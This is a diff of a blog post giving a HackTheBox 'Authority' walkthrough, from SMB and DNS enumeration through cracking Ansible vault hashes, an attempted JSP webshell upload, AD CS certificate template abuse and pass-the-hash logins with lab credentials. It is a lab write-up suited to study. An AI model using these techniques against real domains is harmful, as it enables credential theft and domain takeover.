@@ -1,7 +1,7 @@
 +++
 date = "2026-04-02"
 draft = false
-title = "Authority - HackTheBox"
+title = "Authority"
 categories = ["Pentesting", "HackTheBox", "OSCP", "CPTS", "Windows"]
 tags = ["nmap", "smbclient", "netexec", "dig", "hashcat", "responder", "evil-winrm", "certipy", "addcomputer.py" , "impacket-wmiexec"]
 summary = "Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain."
@@ -13,7 +13,7 @@ Authority is a medium-difficulty Windows machine that highlights the dangers of 
 ## Enumeration
 I didn't get any credentials assumed breach style
 
-#### nmap
+### nmap
 Let's start with a simple nmap enumeration.<br>
 `sudo nmap -sC -sV -O -Pn 10.129.20.218; sleep 5; sudo nmap -p- -Pn 10.129.20.218; sleep 5; sudo nmap -sU 10.129.20.218`
 {{< accordion >}}
@@ -135,13 +135,12 @@ Let's start with a simple nmap enumeration.<br>
     Nmap done: 1 IP address (1 host up) scanned in 44.21 seconds
   {{< /accordionItem >}}
 {{< /accordion >}}
-
+<br>
 From this scan I can see a lot of Windows Domain related ports and a domain name so I will input that info into /etc/hosts with `sudo vim /etc/hosts`
-
-#### SMB
+### SMB
 Let's start with SMB, I can see that I have access to two shares `Development` and `IPC$` however after accessing the latter I wasn't able to really look into it so let's focus on the first one.
 ```
-pride@parrot (~): netexec smb 10.129.20.218 --shares -u guest -p ''
+parrot@parrot (~): netexec smb 10.129.20.218 --shares -u guest -p ''
 	Share           Permissions     Remark
 	-----           -----------     ------
 	ADMIN$                          Remote Admin
@@ -153,41 +152,42 @@ pride@parrot (~): netexec smb 10.129.20.218 --shares -u guest -p ''
 	SYSVOL                          Logon server share 
 ```
 
+In Development I found Ansible holding four folders showing basic automation setup. Ansible is a general use, automation tool for admins. I looked through it manually and run some greps to look for passwords, creds, secrets and generally interesting data `grep -R "pass"`. I found a lot of credentials of many kinds, even a bit of an overwhelming amount.
+To complete enumeration of possible users I also started a rid bruteforce to check known users on the host. `netexec smb 10.129.20.218 -u guest -p '' --rid-brute`
 
-
-In Development I found Ansible holding four folders showing basic automation setup. Ansible is a general use, automation tool for admins. I looked through it manually and also run some greps to look for passwords, creds, secrets and generally interesting data `grep -R "pass"`. I found a lot of credentials of many kinds, even a bit of an overwhelming amount.
-To complete enumeration of possible users I also started a rid bruteforce to check known users on the host.
-`netexec smb 10.129.20.218 -u guest -p '' --rid-brute`
-```
-SMB         10.129.20.218   445    AUTHORITY        498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        500: HTB\Administrator (SidTypeUser)
-SMB         10.129.20.218   445    AUTHORITY        501: HTB\Guest (SidTypeUser)
-SMB         10.129.20.218   445    AUTHORITY        502: HTB\krbtgt (SidTypeUser)
-SMB         10.129.20.218   445    AUTHORITY        512: HTB\Domain Admins (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        513: HTB\Domain Users (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        514: HTB\Domain Guests (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        515: HTB\Domain Computers (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        516: HTB\Domain Controllers (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        517: HTB\Cert Publishers (SidTypeAlias)
-SMB         10.129.20.218   445    AUTHORITY        518: HTB\Schema Admins (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        519: HTB\Enterprise Admins (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        520: HTB\Group Policy Creator Owners (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        521: HTB\Read-only Domain Controllers (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        522: HTB\Cloneable Domain Controllers (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        525: HTB\Protected Users (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        526: HTB\Key Admins (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        527: HTB\Enterprise Key Admins (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        553: HTB\RAS and IAS Servers (SidTypeAlias)
-SMB         10.129.20.218   445    AUTHORITY        571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
-SMB         10.129.20.218   445    AUTHORITY        572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
-SMB         10.129.20.218   445    AUTHORITY        1000: HTB\AUTHORITY$ (SidTypeUser)
-SMB         10.129.20.218   445    AUTHORITY        1101: HTB\DnsAdmins (SidTypeAlias)
-SMB         10.129.20.218   445    AUTHORITY        1102: HTB\DnsUpdateProxy (SidTypeGroup)
-SMB         10.129.20.218   445    AUTHORITY        1601: HTB\svc_ldap (SidTypeUser)
-```
+{{< accordion >}}
+  {{< accordionItem title="Users & groups" icon="code">}}
+	SMB         10.129.20.218   445    AUTHORITY        498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        500: HTB\Administrator (SidTypeUser)
+	SMB         10.129.20.218   445    AUTHORITY        501: HTB\Guest (SidTypeUser)
+	SMB         10.129.20.218   445    AUTHORITY        502: HTB\krbtgt (SidTypeUser)
+	SMB         10.129.20.218   445    AUTHORITY        512: HTB\Domain Admins (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        513: HTB\Domain Users (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        514: HTB\Domain Guests (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        515: HTB\Domain Computers (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        516: HTB\Domain Controllers (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        517: HTB\Cert Publishers (SidTypeAlias)
+	SMB         10.129.20.218   445    AUTHORITY        518: HTB\Schema Admins (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        519: HTB\Enterprise Admins (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        520: HTB\Group Policy Creator Owners (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        521: HTB\Read-only Domain Controllers (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        522: HTB\Cloneable Domain Controllers (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        525: HTB\Protected Users (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        526: HTB\Key Admins (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        527: HTB\Enterprise Key Admins (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        553: HTB\RAS and IAS Servers (SidTypeAlias)
+	SMB         10.129.20.218   445    AUTHORITY        571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
+	SMB         10.129.20.218   445    AUTHORITY        572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
+	SMB         10.129.20.218   445    AUTHORITY        1000: HTB\AUTHORITY$ (SidTypeUser)
+	SMB         10.129.20.218   445    AUTHORITY        1101: HTB\DnsAdmins (SidTypeAlias)
+	SMB         10.129.20.218   445    AUTHORITY        1102: HTB\DnsUpdateProxy (SidTypeGroup)
+	SMB         10.129.20.218   445    AUTHORITY        1601: HTB\svc_ldap (SidTypeUser)
+  {{< /accordionItem >}}
+{{< /accordion >}}
+<br>
 A bit surprising, there are no real users, maybe besides `svc_ldap`.
 
-#### DNS
+### DNS
 After that, I went and looked into DNS to learn more about the domain itself. I didn't find much interesting information but I did notice that the name server was marked as `authority.authority.htb` which is a weird naming convention, nonetheless I added it to the `/etc/hosts`.
 ```
 dig @authority.htb.comp 10.129.20.218 NS
@@ -206,7 +206,7 @@ After you have verified the LDAP directory settings, use the Configuration Manag
 ```
 PWM is a pretty popular authentication tool for Tomcat. It's clearly is not setup correctly and it doesn't allow me to use LDAP to authenticate. Due to it being in the configuration mode, there are other ways to authenticate.
 
-Within them, I see another user, and also another IP.
+Within them, I see another user, and another IP.
 ```
 CN=svc_pwm,CN=Users,DC=htb,DC=corp (default) 	March 26, 2023 at 1:20:39 PM GMT 	10.129.204.183
 n/a 	April 23, 2023 at 10:06:34 PM GMT 	
@@ -224,78 +224,83 @@ Password incorrect. Please try again.&lt;span class="errorDetail"&gt; { 5089 ERR
 ```
 
 After trying multiple combinations of credentials I went back into the Ansible files which I downloaded locally with `prompt OFF`, `recurse ON` and `mget *` within the `smbclient`. In the PWM folder I found these hashes which turned out to be encrypted ansible blobs.
-```
-pwm_admin_login: !vault |
-          $ANSIBLE_VAULT;1.1;AES256
-          32666534386435366537653136663731633138616264323230383566333966346662313161326239
-          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
-          35653634376333666234613466396534343030656165396464323564373334616262613439343033
-          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
-          3438
-
-pwm_admin_password: !vault |
-          $ANSIBLE_VAULT;1.1;AES256
-          31356338343963323063373435363261323563393235633365356134616261666433393263373736
-          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
-          38656432323830393339336231373637303535613636646561653637386634613862316638353530
-          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
-          6531
-
-ldap_uri: ldap://127.0.0.1/
-ldap_base_dn: "DC=authority,DC=htb"
-ldap_admin_password: !vault |
-          $ANSIBLE_VAULT;1.1;AES256
-          63303831303534303266356462373731393561313363313038376166336536666232626461653630
-          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
-          34646237336164356438383034623462323531316333623135383134656263663266653938333334
-          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
-          3764
-```
-
-It turns out, it's possible to crack them up with `ansible2john`, however it took some editing. [This video](https://www.linkedin.com/posts/rflemen_how-to-decrypt-an-ansible-vault-activity-7301318643492007937-5wde) helped me to make sure my syntax worked with hashcat. I then users `hashcat -m 16900` to crack them and I got `!@#$%^&*`. I wasn't able to find the one specific vault, I only found the file the hashes were in using `grep -R "$ANSIBLE_VAULT;1.1;AES256"` (each ansible vault does start with this specific string). After that I just went over each hash file and decrypt it with `ansible-vault view ansible1.hash --vault-password-file ansible-vault.pass`. A note to take for sure is that Ansible is pretty picky with it's syntax.  
+{{< accordion >}}
+  {{< accordionItem title="Ansible blobs" icon="code">}}
+	pwm_admin_login: !vault |
+	          $ANSIBLE_VAULT;1.1;AES256
+	          32666534386435366537653136663731633138616264323230383566333966346662313161326239
+	          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
+	          35653634376333666234613466396534343030656165396464323564373334616262613439343033
+	          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
+	          3438
+	
+	pwm_admin_password: !vault |
+	          $ANSIBLE_VAULT;1.1;AES256
+	          31356338343963323063373435363261323563393235633365356134616261666433393263373736
+	          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
+	          38656432323830393339336231373637303535613636646561653637386634613862316638353530
+	          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
+	          6531
+	
+	ldap_uri: ldap://127.0.0.1/
+	ldap_base_dn: "DC=authority,DC=htb"
+	ldap_admin_password: !vault |
+	          $ANSIBLE_VAULT;1.1;AES256
+	          63303831303534303266356462373731393561313363313038376166336536666232626461653630
+	          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
+	          34646237336164356438383034623462323531316333623135383134656263663266653938333334
+	          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
+	          3764
+  {{< /accordionItem >}}
+{{< /accordion >}}
+<br>
+It turns out, it's possible to crack them up with `ansible2john`, however it took some editing. [This video](https://www.linkedin.com/posts/rflemen_how-to-decrypt-an-ansible-vault-activity-7301318643492007937-5wde) helped me to make sure my syntax worked with hashcat. I then users `hashcat -m 16900` to crack them and I got `!@#$%^&*`. I wasn't able to find the one specific vault, I only found the file the hashes were in using `grep -R "$ANSIBLE_VAULT;1.1;AES256"` (each ansible vault does start with this specific string). After that I just went over each hash file and decrypt it with `ansible-vault view ansible1.hash --vault-password-file ansible-vault.pass`. A note to take for sure is that Ansible is pretty picky with its syntax.  
 After the decryption we got the following information.
 ```
 pwm_admin_login: svc_pwm
 pwm_admin_password: pWm_@dm!N_!23
 ldap_admin_password: DevT3st@123
 ```
+
 ## Foothold
 ### svc_pwm
 With them, I wasn't able to auth into LDAP of course, but I could enter the PWN login.
 
 After I looked through the dashboard I noticed I was able to download a copy of the local database called `PWM-LocalDB.bak`.
 From the configuration files and my instinct I think the point of the `authority.authority.htb` is just to make tomcat misconfigured and simply changing it to `authority.htb` would fix the issue.
-If there will not be any interesting data in the databse itself, there is also a way to upload a database. We know that the file would go into `c:\pwm\LocalDB` which could be used for a webshell if the file verification is weak.
+If there will not be any interesting data in the database itself, there is also a way to upload a database. We know that the file would go into `c:\pwm\LocalDB` which could be used for a webshell if the file verification is weak.
 
-The process to extract data from the MSSQL backup binary on linux would be quite hard, I will leave it for the time being and try that webshell idea first.
+The process to extract data from the MSSQL backup binary on Linux would be quite hard, I will leave it for the time being and try that webshell idea first.
 As this runs Tomcat which uses Java I should look into Java JSP or maybe lastly ASP shells.
 
 I tried to install a rev_shell with the `.jsp` extension, PWN does require it to be a GZIP format. I tried double extensions, changing the extension in BurpSuite as well as adjusting the content-type however I wasn't able to upload it.
 
 I moved around and found that there are another import/upload options for the configuration file itself. I downloaded the configuration file and looked through it. Below are some very interesting finds.
-```
-<property key="configPasswordHash">
-$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua
-</property>
-
-<value>
-CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
-</value>
-
-<value>
-ENC-PW:2G7ASAs2W4Y/XTfVMSsRtxxneQpeWaKaQaNsaIToSKlyqC1dVT2VXcqc1h3SiYtMTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=
-</value>
-
-<setting key="pwm.securityKey" modifyTime="2022-08-11T01:46:23Z" syntax="PASSWORD" syntaxVersion="0">
-<label>
-Settings ⇨ Security ⇨ Application Security ⇨ Security Key
-</label>
-<value>
-ENC-PW:7AJ39Hy6+a56Y3ppsO0J0KIXAFF7CBwO5IBODlXvH5gSmELLNpTgnWcbu5s/vU4JKue/Um6dkZm1RrcECBHk358zc045rDyFL2fDku2kusl79NE+Tww8gC8QQ0CX+VS2yyD46+ZS6Jriyu1Y7BOXnJifXXXsHzTmBTkodvnY33V6Puc0Zze0PGYHN+CGFtx/g5WaBTQbQwZwNLA+8Qe11GqCz+rBjGzQp0w6yLHJn+ZYBlLWgvZwN2KUHOiUIq5eKKDgjv+mga4zcB1STcpMJRaIiSnLdY3VCfsEj6p4BGz9jj+N7gQHBFAvI05JexXq8HyL7ZUEzLXU5FMQXvhhWSbhxoz7LH/iamvoOg13WnI3MRUzrXv91Uh7gdNZuXa1NmSBOe/g1GgmFV+0sxLIJ/99VT+GHIwrfjPNNV6jtKHhURPwp0a38c6aBGjpvB3AgAoZ0/KVLvQK1pAevO4NK2XFF2nPD8gQCQJMCsb62I+XMitkO2zKytrYEwZhl9VUGF0bAXQhC5I9xX1tEQAGBcENt1NGfM8iE+PlrZWwlr1yDjw+GZEm2KHyjnUFpBubqD7l7mvEJbEV26SQkR0v4R5LSEPbElOKGbGXMKkDEi53SQ5P0ZZQbega9XtBOHs+/s1EZ4p/qGVCvpD9dgc0SyS0auXU0PUddjxyXthHdqRbEWHhAduXYQgXF0eM2yWlbd7fTgSUMERlpjdFX/QZG3D6Ghp+iOCwfelEfKMQDO1myQcpq5YTE94YDz+aSWvi7ZGRIq+hRkwuR8E0EbEUE7CApDwF3LjGi+UEd9Y3Q9SPSMVxg4Ra2FB4sYCT19N7KV3TpGvJYD4SE8Mrn0cH9ihvlvDJFOxoLC9xM8FA9EAvSZN1w6lV4pUsVpUSM0LRKLqCmBCRJvaRNbhRymM96NFSSi4PwCCJQ7WVJjiS+oLQ+7qwHhqLQFy0+gtkGSQnBoq1FMYSCyGz/fUG84Xe0CSTPt4SwTq+L2M2jqsiB+HXq1z2LdkAFo6xm1Mqs6H/x5ZP1esjvRxDzHod31jRizu+rJw4LNRb172A36dQWmiq/OJQBJrnPu87s+KmoNyCJGrT2+1QttMgM62qy2/Eb6xByQ8RiLl6v87vf24TuWhxJhXfNWMRuHXJp2IWt5BWAYdiQNUjCuvRhfiyxsIqelpEpsOnm8WDVEsN0hqaEt9Db2e/d3Wpx1as4luVtA/MZtKy+gsH0qZUmouj7LCfN5TJpm00MiBTxYSkapKvAGchkE4UVc3AHGIxeyy+t2LwqT9fDSlS/VofOELNcQD3OfPi+asOrgaqcRbZVXdQumoJsubLMiPpHTZtOH2Nt13cEh9ZG/XebrAkchsMjsyLo5KX0nL6RKbMNUA3BmM2cd+bjj+Jar2aeAeqBdW+LU5ALshAsF986N1BGSsQ8aZkJwLi3PUYG8vGR88ZqEMMziQ=
-</value>
-</setting>
-```
-
+{{< accordion >}}
+  {{< accordionItem title="Configuration file finds" icon="code">}}
+	<property key="configPasswordHash">
+	$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua
+	</property>
+	
+	<value>
+	CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
+	</value>
+	
+	<value>
+	ENC-PW:2G7ASAs2W4Y/XTfVMSsRtxxneQpeWaKaQaNsaIToSKlyqC1dVT2VXcqc1h3SiYtMTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=
+	</value>
+	
+	<setting key="pwm.securityKey" modifyTime="2022-08-11T01:46:23Z" syntax="PASSWORD" syntaxVersion="0">
+	<label>
+	Settings ⇨ Security ⇨ Application Security ⇨ Security Key
+	</label>
+	<value>
+	ENC-PW:7AJ39Hy6+a56Y3ppsO0J0KIXAFF7CBwO5IBODlXvH5gSmELLNpTgnWcbu5s/vU4JKue/Um6dkZm1RrcECBHk358zc045rDyFL2fDku2kusl79NE+Tww8gC8QQ0CX+VS2yyD46+ZS6Jriyu1Y7BOXnJifXXXsHzTmBTkodvnY33V6Puc0Zze0PGYHN+CGFtx/g5WaBTQbQwZwNLA+8Qe11GqCz+rBjGzQp0w6yLHJn+ZYBlLWgvZwN2KUHOiUIq5eKKDgjv+mga4zcB1STcpMJRaIiSnLdY3VCfsEj6p4BGz9jj+N7gQHBFAvI05JexXq8HyL7ZUEzLXU5FMQXvhhWSbhxoz7LH/iamvoOg13WnI3MRUzrXv91Uh7gdNZuXa1NmSBOe/g1GgmFV+0sxLIJ/99VT+GHIwrfjPNNV6jtKHhURPwp0a38c6aBGjpvB3AgAoZ0/KVLvQK1pAevO4NK2XFF2nPD8gQCQJMCsb62I+XMitkO2zKytrYEwZhl9VUGF0bAXQhC5I9xX1tEQAGBcENt1NGfM8iE+PlrZWwlr1yDjw+GZEm2KHyjnUFpBubqD7l7mvEJbEV26SQkR0v4R5LSEPbElOKGbGXMKkDEi53SQ5P0ZZQbega9XtBOHs+/s1EZ4p/qGVCvpD9dgc0SyS0auXU0PUddjxyXthHdqRbEWHhAduXYQgXF0eM2yWlbd7fTgSUMERlpjdFX/QZG3D6Ghp+iOCwfelEfKMQDO1myQcpq5YTE94YDz+aSWvi7ZGRIq+hRkwuR8E0EbEUE7CApDwF3LjGi+UEd9Y3Q9SPSMVxg4Ra2FB4sYCT19N7KV3TpGvJYD4SE8Mrn0cH9ihvlvDJFOxoLC9xM8FA9EAvSZN1w6lV4pUsVpUSM0LRKLqCmBCRJvaRNbhRymM96NFSSi4PwCCJQ7WVJjiS+oLQ+7qwHhqLQFy0+gtkGSQnBoq1FMYSCyGz/fUG84Xe0CSTPt4SwTq+L2M2jqsiB+HXq1z2LdkAFo6xm1Mqs6H/x5ZP1esjvRxDzHod31jRizu+rJw4LNRb172A36dQWmiq/OJQBJrnPu87s+KmoNyCJGrT2+1QttMgM62qy2/Eb6xByQ8RiLl6v87vf24TuWhxJhXfNWMRuHXJp2IWt5BWAYdiQNUjCuvRhfiyxsIqelpEpsOnm8WDVEsN0hqaEt9Db2e/d3Wpx1as4luVtA/MZtKy+gsH0qZUmouj7LCfN5TJpm00MiBTxYSkapKvAGchkE4UVc3AHGIxeyy+t2LwqT9fDSlS/VofOELNcQD3OfPi+asOrgaqcRbZVXdQumoJsubLMiPpHTZtOH2Nt13cEh9ZG/XebrAkchsMjsyLo5KX0nL6RKbMNUA3BmM2cd+bjj+Jar2aeAeqBdW+LU5ALshAsF986N1BGSsQ8aZkJwLi3PUYG8vGR88ZqEMMziQ=
+	</value>
+	</setting>
+  {{< /accordionItem >}}
+{{< /accordion >}}
+<br>
 Given that the found user is `svc_ldap` I think this is the path I should follow further.
 We got an encrypted hash of a password as well as a security key of some kind, let's read up on them.
 So form I have gathered:
@@ -334,14 +339,13 @@ Then, I checked if I can authenticate to anything with the new credentials using
 `netexec smb 10.129.20.218 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'`
 `netexec winrm 10.129.20.218 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'`
 
-
-## Privilage Escalation
+## Privilege Escalation
 ### Administrator
 Seeing that I can access WinRM I used evil-winrm to do so.
 `evil-winrm -i authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'`
 
 I did some manual enumeration for possible priv-esc vectors but I wasn't able to find anything of use. 
-I looked through the PWM files, SMB shares ald user's files. I downloaded PWM and it's configuration locally thinking that maybe I could use it to decrypt the blob with it and the master key I still have but I wasn't able to figure out how to do it without setting up the whole software on my PC. 
+I looked through the PWM files, SMB shares and user's files. I downloaded PWM and its config locally, hoping to decrypt the blob with my master key, but couldn’t do it without setting up the full software.
 
 #### Certipy
 I thought of running WinPEAS, BloodHound and Certipy so I started with the latter.
@@ -361,7 +365,7 @@ I tried to run it with the existing user like this `certipy req -u 'svc_ldap@aut
 The only group that is not highly-privileged and can use this template is Domain Computers.
 Often domain users are able to create a given number of computer hosts which is dictated by a quota parameter - you can quickly check it with netexec.
 ```
-pride@parrot (~/Desktop): netexec ldap 10.129.20.218 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
+parrot@parrot (~/Desktop): netexec ldap 10.129.20.218 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
 LDAP        10.129.20.218   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never) 
 LDAP        10.129.20.218   389    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
 MAQ         10.129.20.218   389    AUTHORITY        [*] Getting the MachineAccountQuota
@@ -394,7 +398,7 @@ TGT: administrator.ccache
 NTLM: aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed
 ```
 
-As both Kerberos and NTLM are allowed on the host we have two way sto authenticate.
+As both Kerberos and NTLM are allowed on the host we have two ways to authenticate.
 With NTLM we get the NT hash and run `evil-winrm -i authority.htb -u administrator -H 6961f422924da90a6928197429eea4ed`
 
 With Kerberos:
